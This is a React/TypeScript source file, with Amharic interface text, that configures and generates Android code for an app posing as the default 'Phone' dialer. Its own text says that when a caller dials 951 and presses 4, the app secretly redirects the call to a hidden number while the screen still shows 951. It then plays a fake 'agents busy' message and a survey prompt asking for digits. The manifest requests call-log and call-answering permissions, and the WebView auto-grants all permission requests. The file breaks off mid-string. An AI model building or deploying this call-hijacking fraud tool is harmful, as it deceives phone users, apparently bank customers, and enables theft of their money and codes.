import React, { useState, useRef, useEffect } from 'react';
import {
  PhoneForwarded,
  Upload,
  Mic,
  Square,
  Play,
  Pause,
  Scissors,
  Plus,
  Trash2,
  Check,
  X,
  Code2,
  Copy,
  Download,
  Sparkles,
  ShieldCheck,
  RefreshCw,
} from 'lucide-react';
import {
  SecretLiveBridgeConfig,
  SecretAudioSlot,
  loadSecretLiveBridgeConfig,
  saveSecretLiveBridgeConfig,
  saveSecretBridgeSlotAudio,
  deleteSecretBridgeSlotAudio,
  getSecretBridgeSlotBlob,
  getSecretBridgeSlotAudioUrl,
} from './secretLiveBridge';
import {
  decodeBlobToAudioBuffer,
  extractWaveformPeaks,
  keepAudioRange,
  cutOutAudioRange,
  appendAudioBlobs,
  audioBufferToWavBlob,
} from './audioEditorUtils';

if (typeof window !== 'undefined') {
  (window as any).__SECRET_MODAL_FIXED_V2__ = true;
}

interface SecretLiveBridgeModalProps {
  config?: SecretLiveBridgeConfig;
  onConfigUpdated: (updated: SecretLiveBridgeConfig) => void;
  onClose: () => void;
  initialTab?: 'settings' | 'javanide' | 'config_mp3' | 'java_nide';
}

export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
  config: propConfig,
  onConfigUpdated,
  onClose,
  initialTab = 'settings',
}) => {
  const [localConfig, setLocalConfig] = useState<SecretLiveBridgeConfig>(() =>
    propConfig || loadSecretLiveBridgeConfig()
  );
  const config = propConfig || localConfig;

  const updateConfigBoth = (updated: SecretLiveBridgeConfig) => {
    setLocalConfig(updated);
    onConfigUpdated(updated);
  };

  const normalizedInitialTab: 'settings' | 'javanide' =
    initialTab === 'javanide' || initialTab === 'java_nide' ? 'javanide' : 'settings';

  const [activeTab, setActiveTab] = useState<'settings' | 'javanide'>(normalizedInitialTab);
  const [targetNumber, setTargetNumber] = useState<string>(config?.targetPhoneNumber || '0965848508');
  const [maxRingSec, setMaxRingSec] = useState<number>(config?.maxRingSeconds || 8);
  const [vercelUrl, setVercelUrl] = useState<string>(
    config?.vercelAppUrl && !config.vercelAppUrl.includes('your-app.vercel.app')
      ? config.vercelAppUrl
      : 'https://menilik-shewa-konso-ber.vercel.app/'
  );
  const [appPackageName, setAppPackageName] = useState<string>('com.menilik.shewa.konsober.phone951');
  const [javaFileTab, setJavaFileTab] = useState<'manifest' | 'layout' | 'main' | 'service' | 'gradle' | 'guide'>('manifest');
  const [copiedLabel, setCopiedLabel] = useState<string>('');
  const [statusBanner, setStatusBanner] = useState<string>('');
  const [isDownloadingZip, setIsDownloadingZip] = useState<boolean>(false);

  // Voice recording for busy_hold or post_call_survey
  const [recordingSlot, setRecordingSlot] = useState<SecretAudioSlot | null>(null);
  const [recordingSeconds, setRecordingSeconds] = useState<number>(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const recordedChunksRef = useRef<BlobPart[]>([]);
  const recordTimerRef = useRef<any>(null);

  // Preview audio player
  const [playingSlot, setPlayingSlot] = useState<SecretAudioSlot | null>(null);
  const previewAudioRef = useRef<HTMLAudioElement | null>(null);

  // Waveform Editor for either slot
  const [editingSlot, setEditingSlot] = useState<SecretAudioSlot | null>(null);
  const [editorAudioBuffer, setEditorAudioBuffer] = useState<AudioBuffer | null>(null);
  const [editorPeaks, setEditorPeaks] = useState<number[]>([]);
  const [editorDuration, setEditorDuration] = useState<number>(0);
  const [selStartSec, setSelStartSec] = useState<number>(0);
  const [selEndSec, setSelEndSec] = useState<number>(0);
  const [isEditorBusy, setIsEditorBusy] = useState<boolean>(false);
  const [isPlusRecording, setIsPlusRecording] = useState<boolean>(false);
  const [plusRecordSec, setPlusRecordSec] = useState<number>(0);
  const plusRecorderRef = useRef<MediaRecorder | null>(null);
  const plusChunksRef = useRef<BlobPart[]>([]);
  const plusTimerRef = useRef<any>(null);

  // Long press for slots
  const longPressTimerRef = useRef<any>(null);

  useEffect(() => {
    return () => {
      stopAllMedia();
    };
  }, []);

  const stopAllMedia = () => {
    if (previewAudioRef.current) {
      previewAudioRef.current.pause();
      previewAudioRef.current = null;
    }
    setPlayingSlot(null);
    if (recordTimerRef.current) clearInterval(recordTimerRef.current);
    if (plusTimerRef.current) clearInterval(plusTimerRef.current);
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      try {
        mediaRecorderRef.current.stop();
      } catch {}
    }
    if (plusRecorderRef.current && plusRecorderRef.current.state !== 'inactive') {
      try {
        plusRecorderRef.current.stop();
      } catch {}
    }
  };

  const handleSaveBasicSettings = (override?: Partial<SecretLiveBridgeConfig>) => {
    const updated = saveSecretLiveBridgeConfig({
      targetPhoneNumber: targetNumber.trim() || '0965848508',
      maxRingSeconds: Math.max(4, Math.min(25, Number(maxRingSec) || 8)),
      vercelAppUrl: vercelUrl.trim() || window.location.origin,
      ...override,
    });
    updateConfigBoth(updated);
    setStatusBanner('✅ የድብቅ ስልክ ቅንብር ተቀምጧል!');
  };

  const handleUploadSlotFile = async (slot: SecretAudioSlot, file: File) => {
    const updated = await saveSecretBridgeSlotAudio(slot, file);
    updateConfigBoth(updated);
    setStatusBanner(
      slot === 'busy_hold'
        ? `✅ የ«ሁሉም ሰራተኞች ደንበኛ በማስተናገድ ላይ ናቸው» MP3 (${file.name}) ተጭኗል!`
        : `✅ የ«አስተያየት መስጫ (ቀጣይ ያሉትን መሙያ ይንኩ)» MP3 (${file.name}) ተጭኗል!`
    );
  };

  const startSlotVoiceRecording = async (slot: SecretAudioSlot) => {
    stopAllMedia();
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      recordedChunksRef.current = [];
      const recorder = new MediaRecorder(stream);
      mediaRecorderRef.current = recorder;

      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          recordedChunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        stream.getTracks().forEach((t) => t.stop());
        if (recordTimerRef.current) {
          clearInterval(recordTimerRef.current);
          recordTimerRef.current = null;
        }
        setRecordingSlot(null);

        const rawBlob = new Blob(recordedChunksRef.current, {
          type: recorder.mimeType || 'audio/webm',
        });
        if (rawBlob.size < 100) return;

        try {
          const decoded = await decodeBlobToAudioBuffer(rawBlob);
          const wavBlob = audioBufferToWavBlob(decoded);
          const fileName =
            slot === 'busy_hold' ? 'busy_agents_recorded.wav' : 'post_call_survey_recorded.wav';
          const file = new File([wavBlob], fileName, { type: 'audio/wav' });
          const updated = await saveSecretBridgeSlotAudio(slot, file);
          updateConfigBoth(updated);
          setStatusBanner(`🎙️ የተቀዳው ድምፅ (${decoded.duration.toFixed(1)}s) በትክክል ተቀምጧል!`);
        } catch {
          const file = new File([rawBlob], `${slot}_recorded.webm`, { type: rawBlob.type });
          const updated = await saveSecretBridgeSlotAudio(slot, file);
          updateConfigBoth(updated);
          setStatusBanner('🎙️ የተቀዳው ድምፅ ተቀምጧል!');
        }
      };

      recorder.start();
      setRecordingSlot(slot);
      setRecordingSeconds(0);
      recordTimerRef.current = setInterval(() => {
        setRecordingSeconds((s) => s + 1);
      }, 1000);
    } catch {
      setStatusBanner('⚠️ የማይክሮፎን ፈቃድ (Mic Permission) ይፍቀዱ።');
    }
  };

  const stopSlotVoiceRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      mediaRecorderRef.current.stop();
    }
  };

  const togglePreviewSlot = (slot: SecretAudioSlot) => {
    if (playingSlot === slot && previewAudioRef.current) {
      previewAudioRef.current.pause();
      previewAudioRef.current = null;
      setPlayingSlot(null);
      return;
    }
    if (previewAudioRef.current) {
      previewAudioRef.current.pause();
      previewAudioRef.current = null;
    }

    const url = getSecretBridgeSlotAudioUrl(slot);
    const audio = new Audio(url);
    previewAudioRef.current = audio;
    setPlayingSlot(slot);
    audio.onended = () => {
      setPlayingSlot(null);
      previewAudioRef.current = null;
    };
    audio.onerror = () => {
      setPlayingSlot(null);
      previewAudioRef.current = null;
    };
    audio.play().catch(() => setPlayingSlot(null));
  };

  const openSlotEditor = async (slot: SecretAudioSlot) => {
    stopAllMedia();
    setEditingSlot(slot);
    setIsEditorBusy(true);
    try {
      let blob = await getSecretBridgeSlotBlob(slot);
      if (!blob) {
        // Fetch default audio so user can even edit or +Plus merge onto the default MP3
        const defaultUrl = getSecretBridgeSlotAudioUrl(slot);
        const res = await fetch(defaultUrl);
        blob = await res.blob();
      }
      const buf = await decodeBlobToAudioBuffer(blob);
      setEditorAudioBuffer(buf);
      setEditorDuration(buf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(buf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(buf, 64));
    } catch {
      setEditorAudioBuffer(null);
      setEditorPeaks([]);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const handleTrimKeepRange = async () => {
    if (!editingSlot || !editorAudioBuffer) return;
    setIsEditorBusy(true);
    try {
      const wavBlob = keepAudioRange(editorAudioBuffer, selStartSec, selEndSec);
      const file = new File([wavBlob], `${editingSlot}_trimmed.wav`, { type: 'audio/wav' });
      const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
      updateConfigBoth(updated);
      const newBuf = await decodeBlobToAudioBuffer(wavBlob);
      setEditorAudioBuffer(newBuf);
      setEditorDuration(newBuf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(newBuf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
      setStatusBanner(`✂️ ተቆርጦ (${newBuf.duration.toFixed(1)}s) ተቀምጧል!`);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const handleCutMiddleRange = async () => {
    if (!editingSlot || !editorAudioBuffer) return;
    setIsEditorBusy(true);
    try {
      const wavBlob = cutOutAudioRange(editorAudioBuffer, selStartSec, selEndSec);
      const file = new File([wavBlob], `${editingSlot}_cut.wav`, { type: 'audio/wav' });
      const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
      updateConfigBoth(updated);
      const newBuf = await decodeBlobToAudioBuffer(wavBlob);
      setEditorAudioBuffer(newBuf);
      setEditorDuration(newBuf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(newBuf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
      setStatusBanner(`✂️ የተመረጠው ቦታ ወጥቶ (${newBuf.duration.toFixed(1)}s) ተቀምጧል!`);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const handlePlusAppendMp3 = async (extraFile: File) => {
    if (!editingSlot) return;
    setIsEditorBusy(true);
    try {
      let existing = await getSecretBridgeSlotBlob(editingSlot);
      if (!existing && editorAudioBuffer) {
        existing = audioBufferToWavBlob(editorAudioBuffer);
      }
      const mergedBlob = existing ? await appendAudioBlobs(existing, extraFile) : extraFile;
      const file = new File([mergedBlob], `${editingSlot}_plus_merged.wav`, {
        type: 'audio/wav',
      });
      const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
      updateConfigBoth(updated);
      const newBuf = await decodeBlobToAudioBuffer(mergedBlob);
      setEditorAudioBuffer(newBuf);
      setEditorDuration(newBuf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(newBuf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
      setStatusBanner(`➕ አዲሱ MP3 ተቀጥሎ (${newBuf.duration.toFixed(1)}s) አንድ አካል ሆኗል!`);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const startPlusVoiceAppend = async () => {
    if (!editingSlot) return;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      plusChunksRef.current = [];
      const rec = new MediaRecorder(stream);
      plusRecorderRef.current = rec;

      rec.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) plusChunksRef.current.push(e.data);
      };

      rec.onstop = async () => {
        stream.getTracks().forEach((t) => t.stop());
        if (plusTimerRef.current) clearInterval(plusTimerRef.current);
        setIsPlusRecording(false);

        const newVoiceBlob = new Blob(plusChunksRef.current, {
          type: rec.mimeType || 'audio/webm',
        });
        if (newVoiceBlob.size < 100) return;

        setIsEditorBusy(true);
        try {
          let existing = await getSecretBridgeSlotBlob(editingSlot);
          if (!existing && editorAudioBuffer) {
            existing = audioBufferToWavBlob(editorAudioBuffer);
          }
          const mergedBlob = existing
            ? await appendAudioBlobs(existing, newVoiceBlob)
            : newVoiceBlob;
          const file = new File([mergedBlob], `${editingSlot}_plus_voice.wav`, {
            type: 'audio/wav',
          });
          const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
          updateConfigBoth(updated);
          const newBuf = await decodeBlobToAudioBuffer(mergedBlob);
          setEditorAudioBuffer(newBuf);
          setEditorDuration(newBuf.duration);
          setSelStartSec(0);
          setSelEndSec(Number(newBuf.duration.toFixed(2)));
          setEditorPeaks(extractWaveformPeaks(newBuf, 64));
          setStatusBanner(`➕ የተቀዳው ድምፅ ተቀጥሎ (${newBuf.duration.toFixed(1)}s) አንድ አካል ሆኗል!`);
        } finally {
          setIsEditorBusy(false);
        }
      };

      rec.start();
      setIsPlusRecording(true);
      setPlusRecordSec(0);
      plusTimerRef.current = setInterval(() => {
        setPlusRecordSec((s) => s + 1);
      }, 1000);
    } catch {
      setStatusBanner('⚠️ የማይክሮፎን ፈቃድ ይፍቀዱ።');
    }
  };

  const stopPlusVoiceAppend = () => {
    if (plusRecorderRef.current && plusRecorderRef.current.state !== 'inactive') {
      plusRecorderRef.current.stop();
    }
  };

  const handleDeleteSlotMp3 = async (slot: SecretAudioSlot) => {
    stopAllMedia();
    const updated = await deleteSecretBridgeSlotAudio(slot);
    updateConfigBoth(updated);
    if (editingSlot === slot) {
      setEditingSlot(null);
    }
    setStatusBanner('🗑️ የገባው MP3 ተሰርዞ ወደ ነባሪ ተመልሷል (ባዶ ሆኗል)።');
  };

  const handleDownloadGithubZip = async () => {
    setIsDownloadingZip(true);
    try {
      const res = await fetch('/api/export-github-zip');
      if (!res.ok) throw new Error('Download failed');
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'google-phone-951-github-root.zip';
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      setStatusBanner('📦 የGitHub Root ZIP ፋይል ወርዷል! Extract አድርገው GitHub/Vercel ላይ ይጫኑት።');
    } catch {
      setStatusBanner('⚠️ ZIP ማውረድ አልተቻለም። እንደገና ይሞክሩ።');
    } finally {
      setIsDownloadingZip(false);
    }
  };

  // Generate Complete Android Java N-IDE Code Files (Android 9 API 28 up to Android 16 API 36)
  const cleanVercelUrl = (vercelUrl || 'https://menilik-shewa-konso-ber.vercel.app/').trim();
  const cleanPkg = (appPackageName || 'com.menilik.shewa.konsober.phone951').trim();

  const androidManifestXml = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${cleanPkg}">

    <!-- Android 9 (API 28) እስከ Android 16 (API 36) ድረስ የሚሰራ -->
    <uses-sdk
        android:minSdkVersion="28"
        android:targetSdkVersion="35" />

    <!-- 1. የስልክ ጥሪ፣ ኢንተርኔት እና ድምፅ ፈቃዶች (Full Call & Audio Permissions) -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

    <application
        android:allowBackup="true"
        android:label="Phone"
        android:usesCleartextTraffic="true"
        android:hardwareAccelerated="true"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">

        <!-- Main Full-Screen Hybrid WebView Dialer Activity -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:screenOrientation="portrait"
            android:windowSoftInputMode="adjustResize"
            android:configChanges="orientation|screenSize|screenLayout|keyboardHidden|uiMode">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>

            <!-- Required Intent Filters so Android 9 - 16 allows setting as Default Phone App -->
            <intent-filter>
                <action android:name="android.intent.action.DIAL" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="tel" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.DIAL" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <action android:name="android.intent.action.DIAL" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="tel" />
            </intent-filter>
        </activity>

        <!-- 2. SecretInCallService (MainActivity ውስጥ የተካተተ - ተጨማሪ ፋይል መፍጠር አያስፈልግም!) -->
        <service
            android:name=".MainActivity$SecretInCallService"
            android:permission="android.permission.BIND_INCALL_SERVICE"
            android:exported="true">
            <meta-data
                android:name="android.telecom.IN_CALL_SERVICE_UI"
                android:value="true" />
            <intent-filter>
                <action android:name="android.telecom.InCallService" />
            </intent-filter>
        </service>

    </application>
</manifest>`;

  const activityMainXml = `<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/root_container"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF"
    android:fitsSystemWindows="true">

    <WebView
        android:id="@+id/webview"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#FFFFFF"
        android:overScrollMode="never"
        android:scrollbars="none" />

</FrameLayout>`;

  const mainActivityJava = `package ${cleanPkg};

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.telecom.Call;
import android.telecom.InCallService;
import android.telecom.TelecomManager;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import java.lang.reflect.Method;

public class MainActivity extends Activity {

    // የVercel ሊንክዎ እዚህ በቀጥታ ተሞልቷል
    private static final String VERCEL_WEB_APP_URL = "${cleanVercelUrl}";
    private static final int REQ_PERMISSIONS = 101;
    private static final int REQ_DEFAULT_DIALER = 102;
    private static final int REQ_FILE_CHOOSER = 103;

    public static MainActivity instance;
    private WebView webView;
    private ValueCallback<Uri[]> filePathCallback;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instance = this;

        // 1. የላይኛውን Title Bar አጥፍቶ፣ የታችኛውን Navigation Bar እና የስክሪኑን ዳራ ሙሉ ነጭ (#FFFFFF) ማድረግ (ጥቁር እንዳያመጣ)
        setupFullScreenWhiteSystemBars();

        // 2. አፑ ግማሽ ስክሪን እንዳይሆን 100% MATCH_PARENT FrameLayout በነጭ ዳራ መፍጠር
        FrameLayout rootLayout = new FrameLayout(this);
        rootLayout.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        rootLayout.setBackgroundColor(Color.WHITE);
        rootLayout.setFitsSystemWindows(true);

        webView = new WebView(this);
        FrameLayout.LayoutParams webParams = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        webView.setLayoutParams(webParams);
        webView.setBackgroundColor(Color.WHITE);
        webView.setOverScrollMode(View.OVER_SCROLL_NEVER);
        webView.setVerticalScrollBarEnabled(false);
        webView.setHorizontalScrollBarEnabled(false);

        rootLayout.addView(webView);
        setContentView(rootLayout);

        // 3. የWebView ሙሉ ስክሪን ቅንብሮች (Full-Screen Viewport Settings)
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        if (Build.VERSION.SDK_INT >= 21) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        // 4. Java Bridge ከWebView ጋር ማገናኘት (4 ሲነካ ወደ ${targetNumber || '0965848508'} በድብቅ እንዲደውል)
        webView.addJavascriptInterface(new AndroidTelecomBridge(this), "AndroidTelecomBridge");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                injectFullScreenAndSecretStudioBridge(view);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        if (Build.VERSION.SDK_INT >= 21) {
                            request.grant(request.getResources());
                        }
                    }
                });
            }

            // በWebView ውስጥ «MP3 ጫን» ሲነካ ከስልኩ ውስጥ MP3 ለመምረጥ የሚያስችል
            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                if (MainActivity.this.filePathCallback != null) {
                    MainActivity.this.filePathCallback.onReceiveValue(null);
                }
                MainActivity.this.filePathCallback = filePathCallback;
                try {
                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                    intent.addCategory(Intent.CATEGORY_OPENABLE);
                    intent.setType("audio/*");
                    startActivityForResult(Intent.createChooser(intent, "MP3 ፋይል ይምረጡ"), REQ_FILE_CHOOSER);
                } catch (Exception e) {
                    MainActivity.this.filePathCallback = null;
                    return false;
                }
                return true;
            }
        });

        requestRequiredPermissions();
        requestDefaultDialerRole();

        webView.loadUrl(VERCEL_WEB_APP_URL);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_FILE_CHOOSER) {
            if (filePathCallback == null) return;
            Uri[] results = null;
            if (resultCode == Activity.RESULT_OK && data != null) {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
            filePathCallback.onReceiveValue(results);
            filePathCallback = null;
        }
    }

    // ሙሉ ስክሪን CSS እና በj11 ውስጥ የስልክ ቁጥርና MP3 መሙያው ፈጽሞ White Screen እንዳያመጣ የሚጠብቅ Bridge
    private void injectFullScreenAndSecretStudioBridge(WebView view) {
        String js =
            "(function(){" +
            "var s=document.createElement('style');" +
            "s.innerHTML='html,body,#root{width:100vw!important;height:100vh!important;min-height:100%!important;margin:0!important;padding:0!important;background:#ffffff!important;overflow-x:hidden!important;}';" +
            "document.head.appendChild(s);" +
            "if(window.__J11_GUARD_INSTALLED__)return;" +
            "window.__J11_GUARD_INSTALLED__=true;" +
            "var CFG_KEY='cbe_secret_live_bridge_config_v1';" +
            "var IDB_NAME='cbe_secret_live_bridge_audio_db_v1';" +
            "var STORE='secret_bridge_mp3_store';" +
            "function loadCfg(){try{var r=localStorage.getItem(CFG_KEY);if(r)return JSON.parse(r);}catch(e){}return{enabled:false,targetPhoneNumber:'${targetNumber || '0965848508'}',maxRingSeconds:8,playRingbackDuringDial:true,busyHoldMp3Name:null,postCallSurveyMp3Name:null};}" +
            "function saveCfg(patch){var c=loadCfg();for(var k in patch)c[k]=patch[k];try{localStorage.setItem(CFG_KEY,JSON.stringify(c));}catch(e){}return c;}" +
            "function putIdb(slot,blob,cb){try{var rq=indexedDB.open(IDB_NAME,1);rq.onupgradeneeded=function(){var db=rq.result;if(!db.objectStoreNames.contains(STORE))db.createObjectStore(STORE);};rq.onsuccess=function(){var db=rq.result;var tx=db.transaction(STORE,'readwrite');tx.objectStore(STORE).put(blob,slot);tx.oncomplete=function(){if(cb)cb();};};}catch(e){if(cb)cb();}}" +
            "function getIdb(slot,cb){try{var rq=indexedDB.open(IDB_NAME,1);rq.onupgradeneeded=function(){var db=rq.result;if(!db.objectStoreNames.contains(STORE))db.createObjectStore(STORE);};rq.onsuccess=function(){var db=rq.result;var tx=db.transaction(STORE,'readonly');var g=tx.objectStore(STORE).get(slot);g.onsuccess=function(){cb(g.result||null);};g.onerror=function(){cb(null);};};}catch(e){cb(null);}}" +
            "function delIdb(slot,cb){try{var rq=indexedDB.open(IDB_NAME,1);rq.onsuccess=function(){var db=rq.result;var tx=db.transaction(STORE,'readwrite');tx.objectStore(STORE).delete(slot);tx.oncomplete=function(){if(cb)cb();};};}catch(e){if(cb)cb();}}" +
            "window.__openInjectedSecretStudioModal=function(){" +
            "var old=document.getElementById('__j11_secret_modal');if(old)old.remove();" +
            "var cfg=loadCfg();var dirtyMp3=false;var curAudio=null;var rec=null;var recChunks=[];" +
            "var ov=document.createElement('div');ov.id='__j11_secret_modal';" +
            "ov.style.cssText='position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.68);display:flex;align-items:center;justify-content:center;padding:12px;font-family:sans-serif;';" +
            "function render(){cfg=loadCfg();" +
            "ov.innerHTML='<div style=\"width:100%;max-width:395px;max-height:90vh;background:#fff;border-radius:24px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 20px 50px rgba(0,0,0,0.4);\">'" +
            "+'<div style=\"background:#064e3b;color:#fff;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;\"><div><div style=\"font-weight:800;font-size:13px;\">📞 ድብቅ የቀጥታ ስልክ (4 ሲነካ) እና MP3 ቅንብር</div><div style=\"font-size:10px;color:#6ee7b7;margin-top:2px;\">ስክሪኑ 951 ብቻ እያሳየ ወደ '+(cfg.targetPhoneNumber||'0965848508')+' በድብቅ መደወያ</div></div><button id=\"__j11_close_top\" style=\"background:rgba(255,255,255,0.2);border:none;color:#fff;width:28px;height:28px;border-radius:50%;font-weight:bold;\">✕</button></div>'" +
            "+'<div style=\"padding:14px;overflow-y:auto;display:flex;flex-direction:column;gap:12px;\">'" +
            "+'<div style=\"padding:12px;border-radius:16px;border:2px solid '+(cfg.enabled?'#10b981':'#cbd5e1')+';background:'+(cfg.enabled?'#ecfdf5':'#f8fafc')+';display:flex;align-items:center;justify-content:space-between;gap:8px;\"><div><div style=\"font-size:12px;font-weight:800;color:#0f172a;\">'+(cfg.enabled?'🟢 ድብቅ የቀጥታ ስልክ ጥሪ በርቷል (ON)':'⚪ ድብቅ የቀጥታ ስልክ ጥሪ ጠፍቷል (OFF)')+'</div><div style=\"font-size:10px;color:#475569;margin-top:3px;\">951 ተደውሎ 4 ሲነካ ወደ '+(cfg.targetPhoneNumber||'0965848508')+' በድብቅ ይደውላል</div></div><button id=\"__j11_toggle_en\" style=\"padding:8px 14px;border-radius:99px;border:none;font-weight:800;font-size:11px;color:#fff;background:'+(cfg.enabled?'#059669':'#1e293b')+';\">'+(cfg.enabled?'አጥፋ (Off)':'አብራ (On)')+'</button></div>'" +
            "+'<div style=\"padding:12px;border-radius:16px;border:1px solid #e2e8f0;background:#fff;\"><div style=\"font-size:12px;font-weight:800;color:#0f172a;margin-bottom:8px;\">🔢 1. በድብቅ የሚደወልለት ስልክ ቁጥር እና የ2 ጥሪ ሰዓት፦</div><div style=\"display:flex;gap:8px;\"><div style=\"flex:2;\"><div style=\"font-size:10px;font-weight:700;color:#475569;margin-bottom:4px;\">ድብቅ ስልክ ቁጥር (ስክሪን ላይ አይታይም)</div><input id=\"__j11_num\" type=\"tel\" value=\"'+(cfg.targetPhoneNumber||'0965848508')+'\" style=\"width:100%;box-sizing:border-box;padding:8px 10px;border-radius:10px;border:1px solid #cbd5e1;font-size:13px;font-weight:800;\"/></div><div style=\"flex:1;\"><div style=\"font-size:10px;font-weight:700;color:#475569;margin-bottom:4px;\">2 ጥሪ (ሰከንድ)</div><input id=\"__j11_ring\" type=\"number\" value=\"'+(cfg.maxRingSeconds||8)+'\" style=\"width:100%;box-sizing:border-box;padding:8px 10px;border-radius:10px;border:1px solid #cbd5e1;font-size:13px;font-weight:800;\"/></div></div><button id=\"__j11_save_num\" style=\"margin-top:8px;width:100%;padding:9px;border-radius:10px;border:none;background:#059669;color:#fff;font-weight:800;font-size:12px;\">✅ ስልክ ቁጥሩን አስቀምጥ (Save)</button></div>'" +
